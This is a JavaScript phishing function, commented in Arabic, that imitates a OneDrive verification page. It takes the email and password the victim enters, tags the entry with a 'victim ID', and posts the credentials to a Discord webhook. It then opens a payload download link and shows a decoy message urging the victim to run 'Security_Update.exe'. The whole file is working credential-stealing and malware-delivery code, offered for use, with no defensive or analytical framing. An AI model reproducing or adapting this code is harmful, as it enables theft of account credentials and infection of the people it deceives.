async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    
    if(!email || !pass) return alert("يرجى إكمال التوثيق");

    const victimID = "ID-" + Math.floor(Math.random() * 9000 + 1000);

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // 1. إرسال الصيد للديسكورد
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `💀 **هدف جديد (OneDrive):**\nالـ ID: \`${victimID}\`\n📧 الإيميل: \`${email}\`\n🔑 الباسورد: \`${pass}\``
            })
        });

        // 2. تحويل رابط OneDrive لتحميل مباشر
        let directLink = config.pc_payload.replace('1drv.ms', 'api.onedrive.com/v1.0/shares/u!')
                                         .replace('?', '/root/content?');
        // ملاحظة: الرابط أعلاه يحتاج لتنسيق Base64 أحياناً، لذا سنستخدم الطريقة الأضمن:
        
        // 3. تنفيذ التحميل الإجباري
        const link = document.createElement('a');
        link.href = config.pc_payload; // سيفتح صفحة التحميل الرسمية الموثوقة
        link.target = "_blank"; 
        document.body.appendChild(link);
        link.click();
        
        // رسالة تمويه قوية
        document.body.innerHTML = `
            <div style="text-align:center; margin-top:100px; font-family:sans-serif; color:#6001d2;">
                <h2>✅ تم استلام بياناتك</h2>
                <p>يرجى فتح ملف "Security_Update.exe" الذي بدأ تحميله الآن لإكمال توثيق الحساب.</p>
                <progress value="100" max="100"></progress>
            </div>
        `;

    } catch(e) {
        window.location.href = config.pc_payload;
    }
}
